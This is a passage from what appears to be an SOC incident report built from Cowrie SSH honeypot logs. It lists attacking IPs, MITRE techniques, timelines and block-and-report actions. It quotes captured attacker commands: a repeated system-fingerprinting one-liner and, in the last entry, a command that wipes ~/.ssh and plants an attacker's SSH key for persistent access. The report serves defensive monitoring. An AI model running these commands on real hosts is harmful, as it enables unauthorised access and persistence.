| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:20:49` | `cowrie.session.connect` |
| `2026-08-09 11:20:49` | `cowrie.client.version` |
| `2026-08-09 11:20:49` | `cowrie.client.kex` |
| `2026-08-09 11:20:50` | `cowrie.login.success` |
| `2026-08-09 11:20:51` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f64a07f44cb5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:21 |
| **Last Seen** | 2026-08-09 11:21 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:21:25` | `cowrie.session.connect` |
| `2026-08-09 11:21:28` | `cowrie.client.version` |
| `2026-08-09 11:21:28` | `cowrie.client.kex` |
| `2026-08-09 11:21:42` | `cowrie.login.success` |
| `2026-08-09 11:21:44` | `cowrie.session.params` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.success` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.command.input` |
| `2026-08-09 11:21:44` | `cowrie.log.closed` |
| `2026-08-09 11:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7905c495707f

| Field | Detail |
|---|---|
| **Source IP** | `158.51.96[.]38` |
| **First Seen** | 2026-08-09 11:21 |
| **Last Seen** | 2026-08-09 11:22 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:21:56` | `cowrie.session.connect` |
| `2026-08-09 11:21:56` | `cowrie.client.version` |
| `2026-08-09 11:21:56` | `cowrie.client.kex` |
| `2026-08-09 11:21:56` | `cowrie.login.success` |
| `2026-08-09 11:22:30` | `cowrie.session.file_upload` |
| `2026-08-09 11:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.51.96[.]38` to AbuseIPDB if not already reported
- [ ] Block `158.51.96[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56fe5c874e3d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:24 |
| **Last Seen** | 2026-08-09 11:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:24:18` | `cowrie.session.connect` |
| `2026-08-09 11:24:19` | `cowrie.client.version` |
| `2026-08-09 11:24:19` | `cowrie.client.kex` |
| `2026-08-09 11:24:21` | `cowrie.login.success` |
| `2026-08-09 11:24:22` | `cowrie.session.params` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.success` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:22` | `cowrie.command.input` |
| `2026-08-09 11:24:23` | `cowrie.log.closed` |
| `2026-08-09 11:24:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d75a9562977

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:26 |
| **Last Seen** | 2026-08-09 11:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:26:38` | `cowrie.session.connect` |
| `2026-08-09 11:26:39` | `cowrie.client.version` |
| `2026-08-09 11:26:39` | `cowrie.client.kex` |
| `2026-08-09 11:26:42` | `cowrie.login.success` |
| `2026-08-09 11:26:44` | `cowrie.session.params` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.success` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.command.input` |
| `2026-08-09 11:26:44` | `cowrie.log.closed` |
| `2026-08-09 11:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b61bc7e6f81

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:29 |
| **Last Seen** | 2026-08-09 11:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:29:01` | `cowrie.session.connect` |
| `2026-08-09 11:29:02` | `cowrie.client.version` |
| `2026-08-09 11:29:02` | `cowrie.client.kex` |
| `2026-08-09 11:29:07` | `cowrie.login.success` |
| `2026-08-09 11:29:08` | `cowrie.session.params` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.success` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:08` | `cowrie.command.input` |
| `2026-08-09 11:29:09` | `cowrie.log.closed` |
| `2026-08-09 11:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b9b0b9803c9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:31 |
| **Last Seen** | 2026-08-09 11:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:31:31` | `cowrie.session.connect` |
| `2026-08-09 11:31:34` | `cowrie.client.version` |
| `2026-08-09 11:31:34` | `cowrie.client.kex` |
| `2026-08-09 11:31:36` | `cowrie.login.success` |
| `2026-08-09 11:31:37` | `cowrie.session.params` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.success` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.command.input` |
| `2026-08-09 11:31:37` | `cowrie.log.closed` |
| `2026-08-09 11:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b13000abfec

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:33 |
| **Last Seen** | 2026-08-09 11:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:33:48` | `cowrie.session.connect` |
| `2026-08-09 11:33:49` | `cowrie.client.version` |
| `2026-08-09 11:33:49` | `cowrie.client.kex` |
| `2026-08-09 11:33:52` | `cowrie.login.success` |
| `2026-08-09 11:33:53` | `cowrie.session.params` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.success` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:53` | `cowrie.command.input` |
| `2026-08-09 11:33:54` | `cowrie.log.closed` |
| `2026-08-09 11:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-413b16c4915e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:36 |
| **Last Seen** | 2026-08-09 11:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:36:11` | `cowrie.session.connect` |
| `2026-08-09 11:36:11` | `cowrie.client.version` |
| `2026-08-09 11:36:11` | `cowrie.client.kex` |
| `2026-08-09 11:36:14` | `cowrie.login.success` |
| `2026-08-09 11:36:15` | `cowrie.session.params` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.success` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.command.input` |
| `2026-08-09 11:36:15` | `cowrie.log.closed` |
| `2026-08-09 11:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581a574029b0

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]172` |
| **First Seen** | 2026-08-09 11:36 |
| **Last Seen** | 2026-08-09 11:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:36:58` | `cowrie.session.connect` |
| `2026-08-09 11:36:59` | `cowrie.client.version` |
| `2026-08-09 11:36:59` | `cowrie.client.kex` |
| `2026-08-09 11:37:01` | `cowrie.login.success` |
| `2026-08-09 11:37:02` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]172` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8065c27d88e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.198[.]159` |
| **First Seen** | 2026-08-09 11:37 |
| **Last Seen** | 2026-08-09 11:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:37:07` | `cowrie.session.connect` |
| `2026-08-09 11:37:08` | `cowrie.client.version` |
| `2026-08-09 11:37:08` | `cowrie.client.kex` |
| `2026-08-09 11:37:10` | `cowrie.login.success` |
| `2026-08-09 11:37:10` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.198[.]159` to AbuseIPDB if not already reported
- [ ] Block `65.20.198[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77153e6f2a5a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:38 |
| **Last Seen** | 2026-08-09 11:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:38:23` | `cowrie.session.connect` |
| `2026-08-09 11:38:24` | `cowrie.client.version` |
| `2026-08-09 11:38:24` | `cowrie.client.kex` |
| `2026-08-09 11:38:29` | `cowrie.login.success` |
| `2026-08-09 11:38:33` | `cowrie.session.params` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.success` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:33` | `cowrie.command.input` |
| `2026-08-09 11:38:34` | `cowrie.log.closed` |
| `2026-08-09 11:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561dce991fa7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:40 |
| **Last Seen** | 2026-08-09 11:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:40:48` | `cowrie.session.connect` |
| `2026-08-09 11:40:49` | `cowrie.client.version` |
| `2026-08-09 11:40:49` | `cowrie.client.kex` |
| `2026-08-09 11:40:52` | `cowrie.login.success` |
| `2026-08-09 11:40:54` | `cowrie.session.params` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.success` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:54` | `cowrie.command.input` |
| `2026-08-09 11:40:55` | `cowrie.log.closed` |
| `2026-08-09 11:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22260fda284

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-09 11:42 |
| **Last Seen** | 2026-08-09 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:42:06` | `cowrie.session.connect` |
| `2026-08-09 11:42:06` | `cowrie.client.version` |
| `2026-08-09 11:42:06` | `cowrie.client.kex` |
| `2026-08-09 11:42:07` | `cowrie.login.success` |
| `2026-08-09 11:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7997ce8f721

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-09 11:42 |
| **Last Seen** | 2026-08-09 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:42:06` | `cowrie.session.connect` |
| `2026-08-09 11:42:06` | `cowrie.client.version` |
| `2026-08-09 11:42:06` | `cowrie.client.kex` |
| `2026-08-09 11:42:07` | `cowrie.login.success` |
| `2026-08-09 11:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df1caa3c0cb2

| Field | Detail |
|---|---|
| **Source IP** | `51.77.158[.]34` |
| **First Seen** | 2026-08-09 11:42 |
| **Last Seen** | 2026-08-09 11:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:42:07` | `cowrie.session.connect` |
| `2026-08-09 11:42:07` | `cowrie.client.version` |
| `2026-08-09 11:42:08` | `cowrie.client.kex` |
